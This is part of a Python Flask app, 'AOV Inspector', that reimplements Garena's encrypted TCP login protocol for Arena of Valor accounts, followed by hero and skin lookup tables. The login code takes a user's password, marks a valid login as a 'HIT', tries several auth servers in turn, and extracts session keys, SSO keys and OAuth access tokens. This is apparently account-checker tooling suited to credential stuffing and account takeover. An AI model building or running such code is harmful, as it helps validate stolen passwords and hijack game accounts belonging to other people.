#!/usr/bin/env python3
import sys
# -*- coding: utf-8 -*-
"""
================================================================================
AOV INSPECTOR - ULTIMATE EDITION v7.0.0 (PHẦN 1/2)
================================================================================
🆕 v7.0 UPDATE PHẦN 1:
- ✅ FIX 9 BUG (save race, parse file, hardcoded creds, ...)
- ✅ #5  Random theo TIER (SSS/SS/Anime/Thường)
- ✅ #11 Điểm danh 7 ngày (Streak Reward)
- ✅ #13 Slot Machine (Máy xèng)
- ✅ #15 Huy hiệu (Badges)
- ✅ #28 Accent Color (Đổi màu chủ đạo)
- ✅ #31 Xem quảng cáo nhận xu (Fake Ad 5s)
- ✅ #32 Nhiệm vụ ngày (Daily Quest)
- ✅ #35 Voucher (Giảm giá check)
- ✅ #37 SQLite (Tự động migrate từ JSON)
- ✅ #41 Unit Test cơ bản

📌 PHẦN 2/2 sẽ có: PvP, Friend, Feed, 2FA, Telegram User, IP Block,
   Dashboard Chart, Audit Log, Dark/Light, PWA, Chart, Sound,
   Docker, Redis, Swagger, AI Chatbot, OCR
================================================================================
"""

import os, json, time, uuid, random, hashlib, threading, logging, struct, socket
import shutil, traceback, re, io, csv, string, base64, urllib.request, urllib.parse
import sqlite3
from io import BytesIO
from datetime import datetime, timedelta
from functools import wraps
from typing import Dict, List, Optional, Tuple, Any
from collections import Counter, defaultdict, deque
from concurrent.futures import ThreadPoolExecutor, as_completed
from flask import (Flask, render_template_string, request, jsonify, session,
                   redirect, url_for, flash, get_flashed_messages, Response,
                   send_file, send_from_directory, make_response, abort)
import requests
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


# ============================================================
# 🔧 TCP LOGIN THẬT — TỪ clm.py
# ============================================================
HOST = "103.247.205.14"
PORT = 19000
CLIENT_PLATFORM_ANDROID = 17
CLIENT_VERSION = 283
CLIENT_TYPE = 4352
CMD_LOGIN_PREPARE = 256
CMD_LOGIN = 257
CMD_SSO_KEY_GET = 442
CMD_SESSION_TOKEN_GET = 278
CMD_APP_OAUTH_LOGIN = 439
LIEN_QUAN_APP_ID = 100054
PACKET_VERSION = (CLIENT_PLATFORM_ANDROID << 24) + CLIENT_VERSION
CLIENT_ID_MASK = 4354
_pkt_counter = random.randint(0, 0x3FFFFF)
_pkt_counter_lock = threading.Lock()

# XTEA constants
_XTEA_DELTA = 0x9E3779B9
_XTEA_ROUNDS = 32

def _mix(v: int) -> int:
    return ((v << 4) & 0xFFFFFFFF) ^ (v >> 5)

def _xtea_enc_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = 0
    for _ in range(_XTEA_ROUNDS):
        v0 = (v0 + (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s + _XTEA_DELTA) & 0xFFFFFFFF
        v1 = (v1 + (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def _xtea_dec_block(v0: int, v1: int, key: bytes):
    k = struct.unpack('<4I', key)
    s = (_XTEA_DELTA * _XTEA_ROUNDS) & 0xFFFFFFFF
    for _ in range(_XTEA_ROUNDS):
        v1 = (v1 - (((_mix(v0) + v0) & 0xFFFFFFFF) ^ ((s + k[(s >> 11) & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
        s = (s - _XTEA_DELTA) & 0xFFFFFFFF
        v0 = (v0 - (((_mix(v1) + v1) & 0xFFFFFFFF) ^ ((s + k[s & 3]) & 0xFFFFFFFF))) & 0xFFFFFFFF
    return v0, v1

def xtea_encrypt(data: bytes, key: bytes) -> bytes:
    pad = 8 - len(data) % 8
    data = data + bytes([pad] * pad)
    R = struct.unpack('<Q', os.urandom(8))[0]
    R_bytes = struct.pack('<Q', R)
    enc_R = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', R_bytes), key))
    prev = enc_R
    out = bytearray(enc_R)
    pt_sum = R
    last_ct = enc_R
    for i in range(0, len(data), 8):
        pt_block = data[i:i+8]
        pt_sum = (pt_sum + struct.unpack('<Q', pt_block)[0]) & 0xFFFFFFFFFFFFFFFF
        blk = bytes(a ^ b for a, b in zip(pt_block, prev))
        v0, v1 = _xtea_enc_block(*struct.unpack('<2I', blk), key)
        prev = struct.pack('<2I', v0, v1)
        last_ct = prev
        out.extend(prev)
    last_ct_val = struct.unpack('<Q', last_ct)[0]
    check_input = last_ct_val ^ pt_sum
    check_bytes = struct.pack('<Q', check_input)
    check_enc = struct.pack('<2I', *_xtea_enc_block(*struct.unpack('<2I', check_bytes), key))
    out.extend(check_enc)
    return bytes(out)

def xtea_decrypt(data: bytes, key: bytes) -> bytes:
    if len(data) < 24 or len(data) % 8 != 0:
        return data
    iv = data[:8]
    body = data[8:-8]
    out = bytearray()
    prev = iv
    for i in range(0, len(body), 8):
        blk = body[i:i+8]
        v0, v1 = _xtea_dec_block(*struct.unpack('<2I', blk), key)
        plain = bytes(a ^ b for a, b in zip(struct.pack('<2I', v0, v1), prev))
        out.extend(plain)
        prev = blk
    if out:
        pad = out[-1]
        if 1 <= pad <= 8 and all(b == pad for b in out[-pad:]):
            out = out[:-pad]
    return bytes(out)

# Protobuf helpers
def _varint_enc(n: int) -> bytes:
    out = bytearray()
    while n > 0x7F:
        out.append((n & 0x7F) | 0x80)
        n >>= 7
    out.append(n & 0x7F)
    return bytes(out)

def _pf_varint(tag: int, n: int) -> bytes:
    return _varint_enc((tag << 3) | 0) + _varint_enc(n)

def _pf_bytes(tag: int, b: bytes) -> bytes:
    return _varint_enc((tag << 3) | 2) + _varint_enc(len(b)) + b

def _pf_str(tag: int, s: str) -> bytes:
    return _pf_bytes(tag, s.encode('utf-8'))

def _proto_decode(data: bytes) -> dict:
    fields = {}
    pos = 0
    def _store(fn, val):
        if fn in fields:
            prev = fields[fn]
            if isinstance(prev, list):
                prev.append(val)
            else:
                fields[fn] = [prev, val]
        else:
            fields[fn] = val
    while pos < len(data):
        try:
            key = 0; shift = 0
            while True:
                b = data[pos]; pos += 1
                key |= (b & 0x7F) << shift
                if not (b & 0x80): break
                shift += 7
            fn, wt = key >> 3, key & 7
            if wt == 0:
                val = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    val |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                _store(fn, val)
            elif wt == 2:
                ln = 0; shift = 0
                while True:
                    b = data[pos]; pos += 1
                    ln |= (b & 0x7F) << shift
                    if not (b & 0x80): break
                    shift += 7
                _store(fn, data[pos:pos+ln])
                pos += ln
            else:
                break
        except IndexError:
            break
    return fields

def _proto_get(fields: dict, tag: int, default=None):
    v = fields.get(tag, default)
    if isinstance(v, list):
        return v[-1] if v else default
    return v

def _next_id() -> int:
    global _pkt_counter
    with _pkt_counter_lock:
        _pkt_counter = (_pkt_counter + 1) & 0x7FFFFFFF
        return CLIENT_ID_MASK | _pkt_counter

def _build_frame(cmd: int, body: bytes) -> bytes:
    hdr = (
        _pf_varint(1, PACKET_VERSION) +
        _pf_varint(2, _next_id()) +
        _pf_varint(3, 2) +  # CMD_C2S_REQUEST
        _pf_varint(4, cmd) +
        _pf_varint(6, int(time.time()))
    )
    payload = struct.pack('>H', len(hdr)) + hdr + body
    return struct.pack('<I', len(payload)) + payload

def _recvall(sock, n: int) -> bytes:
    buf = b''
    while len(buf) < n:
        chunk = sock.recv(n - len(buf))
        if not chunk:
            raise ConnectionError("Connection dropped")
        buf += chunk
    return buf

def _recv_frame(sock) -> tuple:
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    payload = _recvall(sock, size)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    raw_hdr = _proto_decode(payload[2:2+hdr_len])
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v) for k, v in raw_hdr.items()}
    body = payload[2+hdr_len:]
    return hdr, body

def _recv_cmd_frame(sock, target_cmd: int, max_tries: int = 5) -> tuple:
    for _ in range(max_tries):
        hdr, body = _recv_frame(sock)
        if hdr.get(4, 0) == target_cmd:
            return hdr, body
    return {}, b''

def _account_type(account: str) -> int:
    if account.isdigit():
        return 3
    if '@' in account:
        return 2
    try:
        int(account)
        return 0
    except ValueError:
        return 1

def _build_login_prepare(account: str, rand_key: bytes) -> bytes:
    inner = (
        _pf_varint(1, 0) +
        _pf_varint(2, _account_type(account)) +
        _pf_str(3, account) +
        _pf_varint(4, CLIENT_TYPE) +
        _pf_varint(5, CLIENT_VERSION)
    )
    enc = xtea_encrypt(inner, rand_key)
    return _pf_bytes(1, rand_key) + _pf_bytes(2, enc)

def _derive_login_key(password: str, salt: str, verify_code: str):
    md5hex = hashlib.md5(password.encode('utf-8')).hexdigest()
    inner_raw = hashlib.sha256((md5hex + salt).encode('utf-8')).digest()
    inner_hex = inner_raw.hex()
    xtea_key = hashlib.sha256((inner_hex + verify_code).encode('utf-8')).digest()[:16]
    pw_hash = md5hex.encode('ascii')
    return xtea_key, pw_hash

def _build_login(account: str, password: str, salt: str, verify_code: str):
    xtea_key, pw_hash = _derive_login_key(password, salt, verify_code)
    device_id = hashlib.md5(account.encode('utf-8')).digest()
    user_status_bytes = _pf_varint(2, 4608)
    inner = (
        _pf_bytes(1, pw_hash) +
        _pf_varint(2, 0) +
        _pf_bytes(3, user_status_bytes) +
        _pf_bytes(4, device_id)
    )
    enc = xtea_encrypt(inner, xtea_key)
    body = _pf_bytes(1, enc)
    return body, xtea_key

def _send_enc_cmd(sock, cmd: int, body: bytes, session_key: bytes, timeout: float = 6) -> tuple:
    old_to = None
    try:
        old_to = sock.gettimeout()
        sock.settimeout(timeout)
    except:
        pass
    try:
        hdr = (
            _pf_varint(1, PACKET_VERSION) +
            _pf_varint(2, _next_id()) +
            _pf_varint(3, 2) +
            _pf_varint(4, cmd) +
            _pf_varint(6, int(time.time()))
        )
        payload = struct.pack('>H', len(hdr)) + hdr + body
        enc_payload = xtea_encrypt(payload, session_key)
        sock.sendall(struct.pack('<I', len(enc_payload)) + enc_payload)
        for _ in range(5):
            hdr2, body2 = _recv_enc_frame(sock, session_key)
            if hdr2.get(4, 0) == cmd:
                return hdr2, body2
        return {}, b''
    finally:
        if old_to is not None:
            try:
                sock.settimeout(old_to)
            except:
                pass

def _recv_enc_frame(sock, session_key: bytes) -> tuple:
    size = struct.unpack('<I', _recvall(sock, 4))[0]
    enc_payload = _recvall(sock, size)
    payload = xtea_decrypt(enc_payload, session_key)
    hdr_len = struct.unpack('>H', payload[:2])[0]
    raw_hdr = _proto_decode(payload[2:2+hdr_len])
    hdr = {k: (_proto_get(raw_hdr, k) if isinstance(v, list) else v) for k, v in raw_hdr.items()}
    body = payload[2+hdr_len:]
    return hdr, body

def _fetch_sso_key(sock, session_key: bytes) -> dict:
    try:
        hdr, body = _send_enc_cmd(sock, CMD_SSO_KEY_GET, b'', session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(body)
        sso = _proto_get(fields, 1)
        if sso is not None:
            return {'sso_key': sso.decode('utf-8') if isinstance(sso, bytes) else str(sso)}
        return {}
    except Exception:
        return {}

def _fetch_session_token(sock, session_key: bytes, app_id: int = 0) -> dict:
    try:
        body = b'' if not app_id else _pf_varint(1, int(app_id))
        hdr, resp = _send_enc_cmd(sock, CMD_SESSION_TOKEN_GET, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        tok = _proto_get(fields, 1)
        if tok is not None:
            return {'session_token': tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)}
        return {}
    except Exception:
        return {}

def _fetch_oauth_token(sock, session_key: bytes, app_id: int) -> dict:
    try:
        body = (
            _pf_varint(1, app_id) +
            _pf_str(2, "") +
            _pf_varint(3, 2) +
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_enc_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key)
        if hdr.get(5, 0) != 0:
            return {}
        fields = _proto_decode(resp)
        tok = _proto_get(fields, 1)
        oid = _proto_get(fields, 4)
        out = {}
        if tok is not None:
            out['access_token'] = tok.decode('utf-8') if isinstance(tok, bytes) else str(tok)
        if oid is not None:
            out['open_id'] = oid.decode('utf-8') if isinstance(oid, bytes) else str(oid)
        return out
    except Exception:
        return {}

def _fetch_oauth_redirect_url(sock, session_key: bytes, redirect_uri: str) -> str:
    """
    Gửi CMD_APP_OAUTH_LOGIN với redirect_uri, trả về URL redirect (có code=...).
    """
    try:
        body = (
            _pf_varint(1, LIEN_QUAN_APP_ID) +
            _pf_str(2, redirect_uri) +
            _pf_varint(3, 1) +          # response_type = CODE
            _pf_str(4, "") +
            _pf_varint(5, 0) +
            _pf_varint(6, CLIENT_PLATFORM_ANDROID)
        )
        hdr, resp = _send_enc_cmd(sock, CMD_APP_OAUTH_LOGIN, body, session_key, timeout=10)
        if hdr.get(5, 0) != 0:
            return ''
        fields = _proto_decode(resp)
        url = _proto_get(fields, 2, b'')
        return url.decode('utf-8') if isinstance(url, bytes) else str(url)
    except Exception:
        return ''

AUTH_SERVERS = ["103.247.205.14", "103.247.205.15", "103.247.205.18"]

def _format_login_error(detail: str) -> str:
    if "PREPARE_FAIL result=101" in detail:
        return "Tài khoản (Tên đăng nhập / Số điện thoại) không tồn tại trên hệ thống Garena."
    if "PREPARE_FAIL result=105" in detail:
        return "Email không tồn tại hoặc chưa liên kết với tài khoản Garena nào. Vui lòng thử dùng Tên đăng nhập (Username)."
    if "PREPARE_FAIL result=173" in detail:
        return "Tài khoản email này yêu cầu đăng nhập bằng Tên đăng nhập (Username) thay vì Email."
    if "PREPARE_FAIL result=106" in detail or "PREPARE_FAIL result=110" in detail:
        return "Định dạng tài khoản không hợp lệ. Vui lòng kiểm tra lại tên đăng nhập hoặc mật khẩu."
    if "LOGIN_FAIL result=1" in detail or "LOGIN_FAIL result=2" in detail:
        return "Mật khẩu không chính xác. Vui lòng kiểm tra lại mật khẩu."
    if "LOGIN_FAIL result=3" in detail:
        return "Tài khoản đang bị khóa hoặc bị hạn chế bởi Garena."
    if "LOGIN_FAIL result=4" in detail:
        return "Garena yêu cầu xác thực Captcha (IP hoặc tài khoản bị giới hạn). Vui lòng đăng nhập trên trang web Garena trước."
    if "LOGIN_FAIL result=5" in detail:
        return "Tài khoản đang bật bảo mật 2 lớp (OTP / Garena Authenticator / SMS). Giao thức TCP không hỗ trợ 2FA trực tiếp."
    if any(f"LOGIN_FAIL result={x}" in detail for x in [6, 7, 8]):
        return "Đăng nhập sai quá nhiều lần liên tiếp. Vui lòng đợi 5-10 phút rồi thử lại."
    if "LOGIN_FAIL result=16" in detail or "LOGIN_FAIL result=17" in detail:
        return "Tài khoản có dấu hiệu bất thường, Garena yêu cầu đổi mật khẩu hoặc xác minh trên web."
    if "TIMEOUT" in detail or "Socket timeout" in detail:
        return "Hết thời gian chờ kết nối máy chủ Garena (Timeout). Vui lòng kiểm tra kết nối mạng."
    return f"Đăng nhập thất bại: {detail}"

def _do_tcp_login_single_host(account: str, password: str, host: str, port: int, timeout: int) -> dict:
    sock = None
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(timeout)
        sock.connect((host, port))

        # Step 1: PREPARE
        rand_key = os.urandom(16)
        prep_body = _build_login_prepare(account, rand_key)
        sock.sendall(_build_frame(CMD_LOGIN_PREPARE, prep_body))
        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN_PREPARE, max_tries=5)
        if hdr.get(5, 0) != 0:
            return {'status': 'ERROR', 'detail': f'PREPARE_FAIL result={hdr.get(5)}'}

        prep_reply = _proto_decode(body)
        reply_key = _proto_get(prep_reply, 1, b'')
        reply_data = _proto_get(prep_reply, 2, b'')
        if not reply_key or not reply_data:
            return {'status': 'ERROR', 'detail': 'Empty LoginPrepareReply'}

        prep_data = _proto_decode(xtea_decrypt(reply_data, reply_key))
        salt = _proto_get(prep_data, 1, b'').decode('utf-8', errors='ignore')
        verify_code = _proto_get(prep_data, 2, b'').decode('utf-8', errors='ignore')

        # Step 2: LOGIN
        login_body, xtea_key = _build_login(account, password, salt, verify_code)
        sock.sendall(_build_frame(CMD_LOGIN, login_body))
        hdr, body = _recv_cmd_frame(sock, CMD_LOGIN, max_tries=5)
        if hdr.get(5, 0) != 0:
            return {'status': 'INVALID', 'detail': f'LOGIN_FAIL result={hdr.get(5)}'}

        login_reply = _proto_decode(body)
        enc_reply = _proto_get(login_reply, 1, b'')
        if not enc_reply:
            return {'status': 'ERROR', 'detail': 'Empty LoginReply data'}

        reply_decoded = _proto_decode(xtea_decrypt(enc_reply, xtea_key))
        uid = _proto_get(reply_decoded, 1, 0)
        session_key = _proto_get(reply_decoded, 2, b'')
        if not uid:
            return {'status': 'ERROR', 'detail': 'UID=0'}
        if not isinstance(session_key, bytes) or len(session_key) != 16:
            return {'status': 'ERROR', 'detail': 'Invalid session_key'}

        result = {
            'status': 'HIT',
            'uid': uid,
            'session_key': session_key.hex(),
            'session_key_bytes': session_key,
        }

        # Fetch sso_key, session_token, oauth token
        try:
            sso = _fetch_sso_key(sock, session_key)
            if sso.get('sso_key'):
                result['sso_key'] = sso['sso_key']
        except:
            pass

        try:
            st = _fetch_session_token(sock, session_key, LIEN_QUAN_APP_ID)
            if st.get('session_token'):
                result['session_token'] = st['session_token']
        except:
            pass

        try:
            oauth = _fetch_oauth_token(sock, session_key, LIEN_QUAN_APP_ID)
            if oauth.get('access_token'):
                result['access_token'] = oauth['access_token']
            if oauth.get('open_id'):
                result['open_id'] = oauth['open_id']
        except:
            pass

        return result

    except socket.timeout:
        return {'status': 'TIMEOUT', 'detail': f'Socket timeout to {host}:{port}'}
    except Exception as e:
        return {'status': 'ERROR', 'detail': str(e)}
    finally:
        if sock:
            try:
                sock.close()
            except:
                pass

def tcp_login(account: str, password: str, timeout: int = 15) -> dict:
    last_res = {}
    for host in AUTH_SERVERS:
        res = _do_tcp_login_single_host(account, password, host, PORT, timeout)
        if res.get('status') == 'HIT':
            return res
        # If it's a permanent logical error (not timeout / network connection error), don't need to try next host
        if res.get('status') == 'INVALID' or 'PREPARE_FAIL' in res.get('detail', ''):
            return res
        last_res = res
    return last_res

# ============================ CẤU HÌNH API ============================

# 🔧 END TCP LOGIN THẬT
# ============================================================


# ============================================================
# 🔧 AUTO-FIX PATCH
# ============================================================
APP_ID = "100054"
UA_WEBVIEW = "Mozilla/5.0 (Linux; Android 9; SM-S9280 Build/PQ3A.190605.07081642; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/124.0.6367.82 Mobile Safari/537.36"
UA = "Mozilla/5.0 (Linux; Android 13) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Mobile Safari/537.36"
UA_DESKTOP = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
CONNECT_AUTH_URL = f"https://{APP_ID}.connect.garena.com"
BASE_COOKIE_STR = (
    "apple_state_key=179d1b269c5711f1846f0ebfc742fc72; fb_state=ae05815a37ec4b91b695c41cc9516001; google_state=de43fab1ead04b78a586c06f80545b9e; huawei_state=e4acea1847394e6981270bb206a154b3; line_state=69f2e70fd2bf41928c36c3d8e776ac3a; twitter_state=26372d744e4147d9afc1c60d3ea05fd6; vk_state=0075d750aaa84d5a804657199130a439; tiktok_state=7b54106a69734748bd1e7d1b23994a41; youtube_state=32ba02b63b9b4ca4a5d799b42e6eff81; vk_code_verifier=C5CG8Z5eRUj7hssZmHAiOZHrdJhinY9vFpNusaFTrPtApRKKjVLHxPt2sIgGR1Ny"
)
COOKIE_BASE = "locale=vi-VN; region=VN"

RANK_MAP = {
    "0":"Bạch Kim","1":"Bạch Kim","2":"Bạch Kim","3":"Kim Cương","4":"Kim Cương",
    "5":"Kim Cương","6":"Tinh Anh","7":"Tinh Anh","8":"Tinh Anh","9":"Cao Thủ",
    "10":"Cao Thủ","11":"Chiến Tướng","12":"Chiến Tướng","13":"Thách Đấu",
    "14":"Thách Đấu","15":"Tinh Hoa","16":"Tinh Hoa",
}

HERO_MAP = {
    "105": "Toro",
    "106": "Krixi",
    "107": "Zephys",
    "108": "Gildur",
    "109": "Veera",
    "110": "Kahlii",
    "111": "Violet",
    "112": "Yorn",
    "113": "Chaugnar",
    "114": "Omega",
    "115": "Jinna",
    "116": "Butterfly",
    "117": "Ormarr",
    "118": "Alice",
    "119": "Mganga",
    "120": "Mina",
    "121": "Marja",
    "123": "Maloch",
    "124": "Ignis",
    "126": "Arduin",
    "127": "Azzen'Ka",
    "128": "Lữ Bố",
    "129": "Triệu Vân",
    "130": "Airi",
    "131": "Murad",
    "132": "Hayate",
    "133": "Valhein",
    "134": "Skud",
    "135": "Thane",
    "136": "Ilumia",
    "137": "Paine",
    "139": "Kil'Groth",
    "140": "Superman",
    "141": "Lauriel",
    "142": "Natalya",
    "144": "Taara",
    "146": "Zill",
    "148": "Preyta",
    "149": "Xeniel",
    "150": "Nakroth",
    "152": "Điêu Thuyền",
    "153": "Kaine",
    "154": "Yena",
    "156": "Aleister",
    "157": "Raz",
    "159": "Dolia",
    "162": "Kriknak",
    "163": "Ryoma",
    "166": "Arthur",
    "167": "Ngộ Không",
    "168": "Lumburr",
    "169": "Slimz",
    "170": "Moren",
    "171": "Cresht",
    "173": "Fennik",
    "174": "Stuart",
    "175": "Grakk",
    "177": "Lindis",
    "180": "Max",
    "184": "Helen",
    "186": "TeeMee",
    "187": "Arum",
    "189": "Krizzix",
    "190": "Tulen",
    "191": "Rouie",
    "192": "Celica",
    "193": "Amily",
    "194": "SuLie",
    "195": "Enzo",
    "196": "Elsu",
    "199": "Eland'orr",
    "206": "Charlotte",
    "501": "Tel'Annas",
    "502": "Astrid",
    "503": "Zuka",
    "504": "Wonder Woman",
    "505": "Baldum",
    "506": "Omen",
    "507": "The Flash",
    "508": "Wisp",
    "509": "Y'bneth",
    "510": "Liliana",
    "511": "Ata",
    "512": "Rourke",
    "513": "Zata",
    "514": "Roxie",
    "515": "Richter",
    "518": "Quillen",
    "519": "Annette",
    "520": "Veres",
    "521": "Florentino",
    "522": "Errol",
    "523": "D'Arcy",
    "524": "Capheny",
    "525": "Zip",
    "526": "Ishar",
    "527": "Sephera",
    "528": "Qi",
    "529": "Volkath",
    "530": "Dirak",
    "531": "Keera",
    "532": "Thorne",
    "533": "Laville",
    "534": "Dextra",
    "535": "Sinestrea",
    "536": "Aoi",
    "537": "Allain",
    "538": "Iggy",
    "539": "Lorion",
    "540": "Bright",
    "541": "Bonnie",
    "542": "Tachi",
    "543": "Aya",
    "544": "Yan",
    "545": "Yue",
    "546": "Teeri",
    "548": "Bijan",
    "563": "Heino",
    "567": "Erin",
    "568": "Ming",
    "577": "ShaoSiYuan",
    "582": "Ciyuanfashi",
    "584": "CiYuansheshou",
    "593": "MaChao",
    "595": "LiXin",
    "596": "Goverra",
    "597": "Biron",
    "598": "Bolt Baron",
    "599": "Billow",
}

def _hero_name_from_id(item_id):
    return HERO_MAP.get(str(item_id), f"Tướng #{item_id}")

def get_hero_name_from_id(item_id):
    return _hero_name_from_id(item_id)


SKIN_TIER_MAP = {
    "10503": {"hero": "Toro", "skin": "Chiến Binh Cổ Đại", "tier": "Thường"},
    "10600": {"hero": "Krixi", "skin": "Mặc định", "tier": "Thường"},
    "10603": {"hero": "Krixi", "skin": "Tiệc Bãi Biển", "tier": "SS"},
    "10605": {"hero": "Krixi", "skin": "Đêm Noel", "tier": "SS"},
    "10611": {"hero": "Krixi", "skin": "Terrible Tornado", "tier": "Anime"},
    "10620": {"hero": "Krixi", "skin": "Phù thủy thời không", "tier": "SSS"},
    "10700": {"hero": "Zephys", "skin": "Mặc định", "tier": "Thường"},
    "10705": {"hero": "Zephys", "skin": "Siêu việt", "tier": "SS"},
    "10709": {"hero": "Zephys", "skin": "Inosuke Hashibira", "tier": "Anime"},
    "10801": {"hero": "Gildur", "skin": "Tiệc Bãi Biển", "tier": "SS"},
    "10805": {"hero": "Gildur", "skin": "Vua Sư Tử", "tier": "Thường"},
    "10912": {"hero": "Veera", "skin": "A.I Love you", "tier": "SS"},
    "10914": {"hero": "Veera", "skin": "Phù thủy Hội họa", "tier": "Anime"},
    "10915": {"hero": "Veera", "skin": "Thất Sát - Thượng Sinh", "tier": "SS"},
    "11000": {"hero": "Kahlii", "skin": "Mặc định", "tier": "Thường"},
    "11001": {"hero": "Kahlii", "skin": "Sơ Cấp", "tier": "Thường"},
    "11004": {"hero": "Kahlii", "skin": "Thánh Nữ Ánh Sáng", "tier": "Thường"},
    "11100": {"hero": "Violet", "skin": "Mặc định", "tier": "Thường"},
    "11104": {"hero": "Violet", "skin": "Xạ Thủ Vàng", "tier": "Thường"},
    "11105": {"hero": "Violet", "skin": "Tiệc bãi biển", "tier": "SS"},
    "11106": {"hero": "Violet", "skin": "Tân Nương Bóng Đêm", "tier": "Thường"},
    "11107": {"hero": "Violet", "skin": "Thứ nguyên vệ thần", "tier": "SSS"},
    "11110": {"hero": "Violet", "skin": "Vợ người ta", "tier": "SS"},
    "11113": {"hero": "Violet", "skin": "Huyết Ma Thần", "tier": "SS"},
    "11115": {"hero": "Violet", "skin": "Thần long tỷ tỷ", "tier": "SS"},
    "11119": {"hero": "Violet", "skin": "Vọng nguyệt Long Cơ", "tier": "SSS"},
    "11120": {"hero": "Violet", "skin": "Nobara Kugisaki", "tier": "Anime"},
    "11202": {"hero": "Yorn", "skin": "Thế Tử Nguyệt Tộc", "tier": "SS"},
    "11205": {"hero": "Yorn", "skin": "Long thần soái", "tier": "SS"},
    "11212": {"hero": "Yorn", "skin": "Vệ Binh ngân hà", "tier": "SS"},
    "11215": {"hero": "Yorn", "skin": "Conan Edogawa", "tier": "Anime"},
    "11600": {"hero": "Butterfly", "skin": "Mặc định", "tier": "Thường"},
    "11601": {"hero": "Butterfly", "skin": "Sơ Cấp", "tier": "Thường"},
    "11604": {"hero": "Butterfly", "skin": "Nữ Quái Nổi Loạn", "tier": "SS"},
    "11605": {"hero": "Butterfly", "skin": "Ám Sát Tinh Vân", "tier": "Thường"},
    "11607": {"hero": "Butterfly", "skin": "Phượng Cửu Thiên", "tier": "SSS"},
    "11610": {"hero": "Butterfly", "skin": "Asuna Tia chớp", "tier": "Anime"},
    "11611": {"hero": "Butterfly", "skin": "Stacia", "tier": "Anime"},
    "11614": {"hero": "Butterfly", "skin": "Kim ngư thần nữ", "tier": "SS"},
    "11616": {"hero": "Butterfly", "skin": "Thánh nữ khởi nguyên", "tier": "SS"},
    "11619": {"hero": "Butterfly", "skin": "Rockgirl Siêu Đẳng", "tier": "SS"},
    "11808": {"hero": "Alice", "skin": "Quân nhạc Athanor", "tier": "SS"},
    "11810": {"hero": "Alice", "skin": "Phi hành gia", "tier": "Anime"},
    "11812": {"hero": "Alice", "skin": "Eternal Sailor Chibi Moon", "tier": "Anime"},
    "12008": {"hero": "Mina", "skin": "Linh Xà yêu vũ", "tier": "SS"},
    "12300": {"hero": "Maloch", "skin": "Mặc định", "tier": "Thường"},
    "12301": {"hero": "Maloch", "skin": "Chiến Binh Hắc Ám", "tier": "Thường"},
    "12304": {"hero": "Maloch", "skin": "Đại Tướng Robot", "tier": "SS"},
    "12312": {"hero": "Maloch", "skin": "Ma Vương Bóng Đêm", "tier": "SS"},
    "12606": {"hero": "Arduin", "skin": "Bạch vệ chiến giáp", "tier": "SS"},
    "12608": {"hero": "Arduin", "skin": "Ngạo Hổ Hàn Đao", "tier": "SS"},
    "12800": {"hero": "Lữ Bố", "skin": "Mặc định", "tier": "Thường"},
    "12801": {"hero": "Lữ", "skin": "Bố Tiệc Bãi Biển", "tier": "SS"},
    "12806": {"hero": "Lữ", "skin": "Bố Tư lệnh Robot", "tier": "SS"},
    "12808": {"hero": "Lữ", "skin": "Bố Ichigo Kurosaki", "tier": "Anime"},
    "12812": {"hero": "Lữ", "skin": "Bố Cửu Thiên Lôi Thần", "tier": "SS"},
    "12900": {"hero": "Triệu Vân", "skin": "Mặc định", "tier": "Thường"},
    "12903": {"hero": "Triệu", "skin": "Vân Dũng Sĩ Đồ Long", "tier": "SS"},
    "12907": {"hero": "Triệu", "skin": "Vân Kỵ sĩ tận thế", "tier": "SS"},
    "12910": {"hero": "Triệu", "skin": "Vân Đoạt Mệnh Thương", "tier": "SS"},
    "12912": {"hero": "Triệu", "skin": "Vân Minh Chung Long Đế", "tier": "SSS"},
    "13005": {"hero": "Airi", "skin": "Kiemono", "tier": "SS"},
    "13006": {"hero": "Airi", "skin": "Bạch Kiemono", "tier": "SS"},
    "13011": {"hero": "Airi", "skin": "Bích hải thánh nữ", "tier": "SSS"},
    "13015": {"hero": "Airi", "skin": "Thứ nguyên Vệ thần", "tier": "SSS"},
    "13104": {"hero": "Murad", "skin": "Siêu việt", "tier": "SS"},
    "13108": {"hero": "Murad", "skin": "Siêu việt 2.0", "tier": "SS"},
    "13109": {"hero": "Murad", "skin": "Chí tôn thần kiếm", "tier": "SS"},
    "13111": {"hero": "Murad", "skin": "Byakuya Kuchiki", "tier": "Anime"},
    "13112": {"hero": "Murad", "skin": "Zenitsu Agatsuma", "tier": "Anime"},
    "13116": {"hero": "Murad", "skin": "Tuyệt thế thần binh", "tier": "SSS"},
    "13118": {"hero": "Murad", "skin": "Thiên Luân Kiếm Thánh", "tier": "SSS"},
    "13200": {"hero": "Hayate", "skin": "Mặc định", "tier": "Thường"},
    "13202": {"hero": "Hayate", "skin": "Ninja Bóng Đêm", "tier": "Thường"},
    "13204": {"hero": "Hayate", "skin": "Tử thần vũ trụ", "tier": "SS"},
